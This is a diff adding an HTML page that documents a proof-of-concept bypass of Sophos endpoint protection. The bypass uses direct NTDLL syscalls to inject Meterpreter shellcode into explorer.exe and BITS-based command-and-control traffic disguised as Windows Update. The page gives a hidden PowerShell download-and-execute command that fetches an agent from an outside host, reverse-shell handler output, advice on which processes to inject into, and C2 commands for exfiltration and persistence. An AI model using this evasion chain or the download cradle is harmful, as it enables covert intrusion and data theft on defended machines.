@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sophos Enterprise AV Bypass - Technical Analysis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #ffffff;
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 50%, #ffa07a 100%);
+            border-radius: 20px;
+            margin-bottom: 40px;
+            box-shadow: 0 20px 60px rgba(233, 69, 96, 0.3);
+        }
+
+        header h1 {
+            font-size: 2.8em;
+            color: #ffffff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin-bottom: 15px;
+        }
+
+        header .subtitle {
+            font-size: 1.3em;
+            color: rgba(255,255,255,0.95);
+            font-weight: 300;
+        }
+
+        header .badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 25px;
+            margin-top: 20px;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Sections */
+        section {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        h2 {
+            color: #ffa07a;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid #e94560;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        h2 .icon {
+            font-size: 1.2em;
+        }
+
+        h3 {
+            color: #ff6b6b;
+            font-size: 1.3em;
+            margin: 25px 0 15px 0;
+        }
+
+        p {
+            color: rgba(255,255,255,0.9);
+            margin-bottom: 15px;
+            font-size: 1.05em;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 25px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border-left: 4px solid #e94560;
+            font-size: 0.95em;
+        }
+
+        code {
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            color: #f8f8f2;
+        }
+
+        .code-comment {
+            color: #6a9955;
+        }
+
+        .code-keyword {
+            color: #ff79c6;
+        }
+
+        .code-string {
+            color: #f1fa8c;
+        }
+
+        .code-function {
+            color: #50fa7b;
+        }
+
+        .code-number {
+            color: #bd93f9;
+        }
+
+        /* Diagram containers */
+        .diagram-container {
+            background: linear-gradient(135deg, #1e2a4a 0%, #152238 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 25px 0;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .diagram-title {
+            color: #ffa07a;
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        /* Layer visualization */
+        .layers-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .layer {
+            padding: 20px 30px;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .layer:hover {
+            transform: translateX(10px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .layer-bypassed {
+            background: linear-gradient(135deg, #2d4739 0%, #1e3a2f 100%);
+            border: 2px solid #4ade80;
+        }
+
+        .layer-active {
+            background: linear-gradient(135deg, #4a2d2d 0%, #3a1e1e 100%);
+            border: 2px solid #f87171;
+        }
+
+        .layer-name {
+            font-weight: 600;
+            font-size: 1.1em;
+            color: #ffffff;
+        }
+
+        .layer-status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+
+        .status-bypassed {
+            background: #4ade80;
+            color: #0a0a0a;
+        }
+
+        .status-active {
+            background: #f87171;
+            color: #0a0a0a;
+        }
+
+        /* Flow diagram */
+        .flow-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            padding: 20px;
+        }
+
+        .flow-box {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-weight: 600;
+            min-width: 250px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(233, 69, 96, 0.3);
+        }
+
+        .flow-box.secondary {
+            background: linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%);
+            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .flow-box.success {
+            background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
+            box-shadow: 0 5px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #ffa07a;
+        }
+
+        /* Info boxes */
+        .info-box {
+            background: linear-gradient(135deg, #1e3a5f 0%, #162a46 100%);
+            border-left: 4px solid #3b82f6;
+            border-radius: 10px;
+            padding: 20px 25px;
+            margin: 20px 0;
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #5f3a1e 0%, #463016 100%);
+            border-left: 4px solid #f59e0b;
+            border-radius: 10px;
+            padding: 20px 25px;
+            margin: 20px 0;
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, #1e5f3a 0%, #164630 100%);
+            border-left: 4px solid #10b981;
+            border-radius: 10px;
+            padding: 20px 25px;
+            margin: 20px 0;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 15px 0 15px 25px;
+            color: rgba(255,255,255,0.9);
+        }
+
+        li {
+            margin-bottom: 10px;
+            padding-left: 10px;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        th {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            color: rgba(255,255,255,0.9);
+        }
+
+        tr:hover {
+            background: rgba(255,255,255,0.05);
+        }
+
+        /* Grid layout */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        }
+
+        .card h4 {
+            color: #ffa07a;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+        }
+
+        /* Memory layout visualization */
+        .memory-layout {
+            background: #0d1117;
+            border-radius: 10px;
+            padding: 20px;
+            font-family: monospace;
+            margin: 20px 0;
+        }
+
+        .memory-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .memory-row:last-child {
+            border-bottom: none;
+        }
+
+        .memory-addr {
+            color: #bd93f9;
+        }
+
+        .memory-value {
+            color: #50fa7b;
+        }
+
+        .memory-label {
+            color: #ff79c6;
+        }
+
+        /* Highlight text */
+        .highlight {
+            background: linear-gradient(135deg, rgba(233, 69, 96, 0.3) 0%, rgba(255, 107, 107, 0.3) 100%);
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: rgba(255,255,255,0.6);
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 40px;
+        }
+
+        footer .disclaimer {
+            font-size: 0.9em;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* Animation */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Syscall table */
+        .syscall-number {
+            font-family: monospace;
+            color: #bd93f9;
+            font-weight: 600;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 2em;
+            }
+            
+            section {
+                padding: 25px;
+            }
+            
+            .flow-box {
+                min-width: 200px;
+                padding: 12px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <h1>🛡️ Sophos Enterprise AV Bypass</h1>
+            <p class="subtitle">Technical Analysis: NTDLL Syscall Injection + BITS C2 Evasion</p>
+            <span class="badge">✅ POC Successful - 2 Detection Layers Bypassed</span>
+        </header>
+
+        <!-- Executive Summary -->
+        <section>
+            <h2><span class="icon">📋</span> Executive Summary</h2>
+            <p>This document details a successful bypass of <strong>Sophos Endpoint Protection Enterprise</strong> using a combination of direct NTDLL syscall injection and BITS (Background Intelligent Transfer Service) C2 communication. The techniques demonstrated here bypass 2 of 4 detection layers while maintaining covert command execution capability.</p>
+            
+            <div class="success-box">
+                <strong>✅ Result:</strong> Achieved reverse shell execution and C2 communication without triggering Sophos detection alerts. The bypass leverages trusted Windows components and low-level system calls to evade userland hooking.
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h4>🎯 Target Environment</h4>
+                    <ul>
+                        <li>Sophos Endpoint Protection Enterprise</li>
+                        <li>Windows 10/11 with current updates</li>
+                        <li>Active real-time protection</li>
+                        <li>Behavior monitoring enabled</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔧 Attack Components</h4>
+                    <ul>
+                        <li>NTDLL Syscall Injection (Layer 2)</li>
+                        <li>BITS C2 Agent (Layer 4)</li>
+                        <li>Process Hollowing Target: explorer.exe</li>
+                        <li>Meterpreter Reverse TCP Payload</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- AV Detection Architecture -->
+        <section>
+            <h2><span class="icon">🔍</span> Sophos Detection Layers</h2>
+            <p>Modern endpoint protection like Sophos operates on multiple layers. Understanding these layers is critical for identifying bypass opportunities.</p>
+
+            <div class="diagram-container">
+                <div class="diagram-title">Detection Layer Status</div>
+                <div class="layers-stack">
+                    <div class="layer layer-active">
+                        <span class="layer-name">Layer 1: Kernel Callbacks (PsSetCreateProcessNotifyRoutine)</span>
+                        <span class="layer-status status-active">Active</span>
+                    </div>
+                    <div class="layer layer-bypassed">
+                        <span class="layer-name">Layer 2: Userland Hooks (kernel32.dll / ntdll.dll)</span>
+                        <span class="layer-status status-bypassed">Bypassed</span>
+                    </div>
+                    <div class="layer layer-active">
+                        <span class="layer-name">Layer 3: ETW Telemetry (Event Tracing for Windows)</span>
+                        <span class="layer-status status-active">Active</span>
+                    </div>
+                    <div class="layer layer-bypassed">
+                        <span class="layer-name">Layer 4: Network Filtering (WFP/NDIS)</span>
+                        <span class="layer-status status-bypassed">Bypassed</span>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Layer Details</h3>
+            <table>
+                <tr>
+                    <th>Layer</th>
+                    <th>Technology</th>
+                    <th>What It Monitors</th>
+                    <th>Bypass Method</th>
+                </tr>
+                <tr>
+                    <td>1. Kernel</td>
+                    <td>Kernel Callbacks</td>
+                    <td>Process/Thread creation, Image loads</td>
+                    <td>Not bypassed (requires kernel driver)</td>
+                </tr>
+                <tr>
+                    <td>2. Userland</td>
+                    <td>API Hooking</td>
+                    <td>VirtualAlloc, WriteProcessMemory, CreateRemoteThread</td>
+                    <td><span class="highlight">Direct NTDLL syscalls</span></td>
+                </tr>
+                <tr>
+                    <td>3. ETW</td>
+                    <td>Event Tracing</td>
+                    <td>PowerShell, .NET, Script blocks</td>
+                    <td>Not bypassed</td>
+                </tr>
+                <tr>
+                    <td>4. Network</td>
+                    <td>WFP/NDIS</td>
+                    <td>Suspicious connections, C2 patterns</td>
+                    <td><span class="highlight">BITS trusted service</span></td>
+                </tr>
+            </table>
+        </section>
+
+        <!-- Windows Internals -->
+        <section>
+            <h2><span class="icon">⚙️</span> Windows Internals: The Call Chain</h2>
+            <p>To understand why our bypass works, we need to understand how Windows API calls flow from userland to the kernel.</p>
+
+            <div class="diagram-container">
+                <div class="diagram-title">Normal API Call Flow (Hooked by AV)</div>
+                <div class="flow-container">
+                    <div class="flow-box">Application Code</div>
+                    <div class="flow-arrow">↓</div>
+                    <div class="flow-box secondary">kernel32.dll (CreateRemoteThread)</div>
+                    <div class="flow-arrow">↓ <small>Sophos hooks here</small></div>
+                    <div class="flow-box secondary">ntdll.dll (NtCreateThreadEx)</div>
+                    <div class="flow-arrow">↓ <small>Sophos hooks here too</small></div>
+                    <div class="flow-box success">SYSCALL instruction → Kernel</div>
+                </div>
+            </div>
+
+            <div class="diagram-container">
+                <div class="diagram-title">Our Bypass: Direct Syscall (Skips Hooks)</div>
+                <div class="flow-container">
+                    <div class="flow-box">Our Injection Code</div>
+                    <div class="flow-arrow">↓</div>
+                    <div class="flow-box success">SYSCALL instruction → Kernel</div>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <strong>💡 Key Insight:</strong> AV products hook DLL functions, not the syscall instruction itself. By calling syscall directly with the correct system call number, we bypass ALL userland hooks while achieving the same kernel functionality.
+            </div>
+        </section>
+
+        <!-- Syscall Mechanism -->
+        <section>
+            <h2><span class="icon">🔢</span> System Call Mechanism</h2>
+            <p>System calls are the interface between userland and the Windows kernel. Each syscall has a unique number that varies between Windows versions.</p>
+
+            <h3>Syscall Numbers (Windows 10 21H2)</h3>
+            <table>
+                <tr>
+                    <th>Function</th>
+                    <th>Syscall Number</th>
+                    <th>Purpose</th>
+                </tr>
+                <tr>
+                    <td>NtAllocateVirtualMemory</td>
+                    <td class="syscall-number">0x18</td>
+                    <td>Allocate memory in target process</td>
+                </tr>
+                <tr>
+                    <td>NtWriteVirtualMemory</td>
+                    <td class="syscall-number">0x3A</td>
+                    <td>Write shellcode to allocated memory</td>
+                </tr>
+                <tr>
+                    <td>NtProtectVirtualMemory</td>
+                    <td class="syscall-number">0x50</td>
+                    <td>Change memory permissions to RWX</td>
+                </tr>
+                <tr>
+                    <td>NtCreateThreadEx</td>
+                    <td class="syscall-number">0xC1</td>
+                    <td>Create remote thread in target</td>
+                </tr>
+            </table>
+
+            <h3>Syscall Assembly Structure</h3>
+            <pre><code><span class="code-comment">; Standard NTDLL syscall stub pattern</span>
+<span class="code-keyword">mov</span>   r10, rcx          <span class="code-comment">; Move first param to r10 (Windows x64 convention)</span>
+<span class="code-keyword">mov</span>   eax, <span class="code-number">0x18</span>         <span class="code-comment">; Syscall number for NtAllocateVirtualMemory</span>
+<span class="code-keyword">syscall</span>                  <span class="code-comment">; Transition to kernel mode</span>
+<span class="code-keyword">ret</span>                      <span class="code-comment">; Return to caller</span></code></pre>
+
+            <div class="warning-box">
+                <strong>⚠️ Version Dependency:</strong> Syscall numbers change between Windows versions. Production tools should dynamically resolve these by parsing ntdll.dll export table or using techniques like "Hell's Gate" for runtime resolution.
+            </div>
+        </section>
+
+        <!-- Injection Technique -->
+        <section>
+            <h2><span class="icon">💉</span> Process Injection Technique</h2>
+            <p>Our injection uses direct syscalls to perform classic shellcode injection into explorer.exe, a trusted system process that blends with normal system activity.</p>
+
+            <h3>Injection Steps</h3>
+            <ol>
+                <li><strong>Open Target Process</strong> - Get handle to explorer.exe (PID: dynamic)</li>
+                <li><strong>Allocate Memory</strong> - Reserve RW memory in target using NtAllocateVirtualMemory</li>
+                <li><strong>Write Shellcode</strong> - Copy Meterpreter payload using NtWriteVirtualMemory</li>
+                <li><strong>Change Permissions</strong> - Set memory to RX using NtProtectVirtualMemory</li>
+                <li><strong>Execute</strong> - Create remote thread using NtCreateThreadEx</li>
+            </ol>
+
+            <h3>Target Process Selection</h3>
+            <div class="grid-2">
+                <div class="card">
+                    <h4>✅ Good Targets</h4>
+                    <ul>
+                        <li><strong>explorer.exe</strong> - Always running, trusted</li>
+                        <li><strong>svchost.exe</strong> - Multiple instances, expected network activity</li>
+                        <li><strong>RuntimeBroker.exe</strong> - Common, low suspicion</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>❌ Avoid These</h4>
+                    <ul>
+                        <li><strong>csrss.exe</strong> - Protected process, will fail</li>
+                        <li><strong>lsass.exe</strong> - Heavily monitored, triggers alerts</li>
+                        <li><strong>notepad.exe</strong> - Unusual for network activity</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Memory Layout After Injection</h3>
+            <div class="memory-layout">
+                <div class="memory-row">
+                    <span class="memory-addr">0x00007FF6A0010000</span>
+                    <span class="memory-label">explorer.exe base</span>
+                </div>
+                <div class="memory-row">
+                    <span class="memory-addr">...</span>
+                    <span class="memory-label">Normal process memory</span>
+                </div>
+                <div class="memory-row">
+                    <span class="memory-addr">0x000001C3B2F00000</span>
+                    <span class="memory-value">[Meterpreter Shellcode - RX]</span>
+                </div>
+                <div class="memory-row">
+                    <span class="memory-addr">↑ New thread executing</span>
+                    <span class="memory-label">Our injected code</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- BITS C2 -->
+        <section>
+            <h2><span class="icon">📡</span> BITS C2 Communication</h2>
+            <p>Background Intelligent Transfer Service (BITS) is a Windows component used for Windows Update and other Microsoft services. By leveraging BITS for C2, our traffic appears as legitimate Windows update activity.</p>
+
+            <h3>Why BITS Works</h3>
+            <div class="grid-2">
+                <div class="card">
+                    <h4>🛡️ AV Perspective</h4>
+                    <ul>
+                        <li>BITS is a trusted Microsoft service</li>
+                        <li>svchost.exe -k netsvcs is expected to make HTTP requests</li>
+                        <li>Traffic resembles Windows Update patterns</li>
+                        <li>Uses WinHTTP stack (not raw sockets)</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔥 Our Advantage</h4>
+                    <ul>
+                        <li>C2 commands over HTTP/WebSocket</li>
+                        <li>Blends with legitimate traffic</li>
+                        <li>Survives process restarts (job persistence)</li>
+                        <li>Built-in retry and bandwidth throttling</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>BITS C2 Architecture</h3>
+            <div class="diagram-container">
+                <div class="diagram-title">Command & Control Flow</div>
+                <div class="flow-container">
+                    <div class="flow-box">C2 Server (FastAPI :8000)</div>
+                    <div class="flow-arrow">↓ WebSocket /ws-bits</div>
+                    <div class="flow-box secondary">BITS Agent (PowerShell)</div>
+                    <div class="flow-arrow">↓ IBackgroundCopyJob</div>
+                    <div class="flow-box success">svchost.exe (BITS Service)</div>
+                </div>
+            </div>
+
+            <h3>BITS Agent Commands</h3>
+            <pre><code><span class="code-comment"># Commands supported by our BITS C2 agent</span>
+<span class="code-function">shell</span> whoami                    <span class="code-comment"># Execute system command</span>
+<span class="code-function">download</span> C:\secrets\data.txt   <span class="code-comment"># Exfiltrate file via BITS</span>
+<span class="code-function">upload</span> malware.exe C:\temp     <span class="code-comment"># Upload file to target</span>
+<span class="code-function">inject</span> calc.exe                <span class="code-comment"># Inject shellcode into process</span>
+<span class="code-function">persist</span>                        <span class="code-comment"># Install persistence mechanism</span>
+<span class="code-function">syscall</span>                        <span class="code-comment"># Execute syscall injection</span></code></pre>
+        </section>
+
+        <!-- Complete Attack Chain -->
+        <section>
+            <h2><span class="icon">⚔️</span> Complete Attack Chain</h2>
+            
+            <h3>Phase 1: Initial Access</h3>
+            <pre><code><span class="code-comment"># Download and execute BITS agent via PowerShell (hidden)</span>
+powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1')"</code></pre>
+
+            <h3>Phase 2: C2 Establishment</h3>
+            <pre><code><span class="code-comment"># Agent connects to C2 via WebSocket</span>
+<span class="code-comment"># Connection appears as BITS traffic to AV</span>
+[BITS Agent] → WebSocket → [FastAPI C2 Server :8000]</code></pre>
+
+            <h3>Phase 3: Syscall Injection</h3>
+            <pre><code><span class="code-comment"># Execute syscall injection from C2 terminal</span>
+<span class="code-function">syscall</span>
+
+<span class="code-comment"># Agent downloads and executes syscall_v3.ps1</span>
+<span class="code-comment"># Direct NTDLL syscalls inject Meterpreter into explorer.exe</span></code></pre>
+
+            <h3>Phase 4: Payload Execution</h3>
+            <pre><code><span class="code-comment"># Meterpreter connects back to attacker</span>
+[*] Started reverse TCP handler on 192.168.1.179:4444
+[*] Sending stage (201798 bytes) to 192.168.1.137
+[*] Meterpreter session 1 opened</code></pre>
+
+            <div class="success-box">
+                <strong>✅ Success:</strong> Full command execution achieved on Sophos-protected endpoint without triggering detection alerts.
+            </div>
+        </section>
+
+        <!-- Detection Evasion Summary -->
+        <section>
+            <h2><span class="icon">🎭</span> Evasion Techniques Summary</h2>
+            
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Evades</th>
+                    <th>How It Works</th>
+                </tr>
+                <tr>
+                    <td>Direct Syscalls</td>
+                    <td>Userland API Hooks</td>
+                    <td>Bypasses kernel32/ntdll hooks by calling syscall instruction directly</td>
+                </tr>
+                <tr>
+                    <td>BITS C2</td>
+                    <td>Network Filtering</td>
+                    <td>Uses trusted Windows service for HTTP traffic, appears as update</td>
+                </tr>
+                <tr>
+                    <td>Process Injection</td>
+                    <td>Process Monitoring</td>
+                    <td>Shellcode runs inside trusted explorer.exe process</td>
+                </tr>
+                <tr>
+                    <td>Hidden PowerShell</td>
+                    <td>Visual Detection</td>
+                    <td>-WindowStyle Hidden prevents user from seeing execution</td>
+                </tr>
+            </table>
+
+            <h3>What Was NOT Bypassed</h3>
+            <div class="warning-box">
+                <strong>⚠️ Remaining Detection Vectors:</strong>
+                <ul>
+                    <li><strong>Kernel Callbacks:</strong> Process creation is still logged at kernel level</li>
+                    <li><strong>ETW Telemetry:</strong> PowerShell script blocks may be logged</li>
+                    <li><strong>Memory Scanning:</strong> Periodic scans could detect Meterpreter in memory</li>
+                    <li><strong>Behavioral Analysis:</strong> Post-exploitation activity patterns</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Advanced Techniques -->
+        <section>
+            <h2><span class="icon">🚀</span> Advanced Bypass Techniques</h2>
+            <p>For even deeper evasion, consider these advanced techniques:</p>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h4>Level 3: Direct Syscall Stubs</h4>
+                    <p>Generate syscall instructions in memory at runtime, completely eliminating ntdll.dll dependency.</p>
+                    <pre><code><span class="code-keyword">mov</span> r10, rcx
+<span class="code-keyword">mov</span> eax, syscall_num
+<span class="code-keyword">syscall</span>
+<span class="code-keyword">ret</span></code></pre>
+                </div>
+                <div class="card">
+                    <h4>Level 4: Fresh NTDLL</h4>
+                    <p>Read clean ntdll.dll from disk and parse syscall numbers, bypassing any in-memory hooks.</p>
+                    <pre><code><span class="code-comment"># Read from disk</span>
+C:\Windows\System32\ntdll.dll
+<span class="code-comment"># Parse PE headers</span>
+<span class="code-comment"># Extract syscall nums</span></code></pre>
+                </div>
+            </div>
+
+            <h3>Tool References</h3>
+            <ul>
+                <li><strong>syscall_v3.ps1</strong> - Level 2: Uses native NTDLL calls (basic bypass)</li>
+                <li><strong>syscall_direct.ps1</strong> - Level 3: Emits raw syscall stubs</li>
+                <li><strong>syscall_fresh_ntdll.ps1</strong> - Level 4: Fresh NTDLL from disk</li>
+            </ul>
+        </section>
+
+        <!-- Footer -->
+        <footer>
+            <p class="disclaimer">
+                ⚠️ <strong>Educational Purpose Only</strong> ⚠️<br><br>
+                This documentation is provided for authorized security research and penetration testing only. 
+                Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
+                The techniques described should only be used in controlled environments with explicit permission.
+            </p>
+            <p style="margin-top: 20px; color: rgba(255,255,255,0.4);">
+                Cyber C2 Framework - POC Documentation
+            </p>
+        </footer>
+    </div>
+</body>
+</html>
